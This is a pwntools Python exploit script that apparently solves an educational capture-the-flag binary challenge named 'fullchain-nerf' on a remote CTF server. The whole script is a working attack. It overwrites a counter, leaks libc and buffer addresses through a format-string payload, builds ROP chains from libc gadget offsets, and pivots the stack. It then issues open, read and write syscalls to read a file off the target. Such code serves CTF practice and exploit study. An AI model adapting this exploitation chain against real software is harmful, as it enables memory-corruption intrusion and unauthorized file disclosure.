from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

# r = process('./fullchain-nerf')
r = remote('edu-ctf.zoolab.org', 30206)

def write(buf):
    r.sendlineafter("global or local > ", buf)
    r.sendlineafter("set, read or write > ", "write")

def read(buf, length, data):
    r.sendlineafter("global or local > ", buf)
    r.sendlineafter("set, read or write > ", "read")
    r.sendlineafter("length > ", str(length))
    r.sendline(data)

# cnt 
payload = b'A' * 0x24 + p32(10000)
read('local', len(payload), payload)

# leak addr
payload = '%19$p %7$p'
read('global', len(payload), payload)
write('global')

r.recvuntil('0x')
libc = int(r.recv(12), 16) - 0x270b3
print(hex(libc))

r.recvuntil('0x')
buf = int(r.recv(12), 16)
filename_addr = buf - 0x200d
print(hex(buf))

# ROP gadgets
rax = libc + 0x4a550
rdi = libc + 0x26b72
rsi = libc + 0x27529
rax_rdx_rbx = libc + 0x162865
leave = libc + 0x5aa48
syscall = libc + 0x66229

# 1st, len(payload) = 0x50
# read 2nd ROP chain
payload = flat(
    0xdeadbeef,
    rax_rdx_rbx, 
    0, 0xd8, 0,
    rsi, buf + 0x50,
    rdi, 0, # fd
    syscall,
) 
read('global', len(payload), payload)

# stack pivoting
payload = flat(
    buf, leave,
)

# 2nd
payload2 = flat(
    # open
    rax_rdx_rbx, 
    2, 0, 0,
    rsi, 0,
    rdi, filename_addr,
    syscall,

    # read
    rax_rdx_rbx, 
    0, 0x30, 0,
    rsi, buf,
    rdi, 3,
    syscall,

    # write
    rax_rdx_rbx, 
    1, 0x30, 0,
    rsi, buf,
    rdi, 1,
    syscall,
)
read('local', 0x30 + len(payload), b'\x00' * 0x30 + payload + payload2) 

r.interactive()
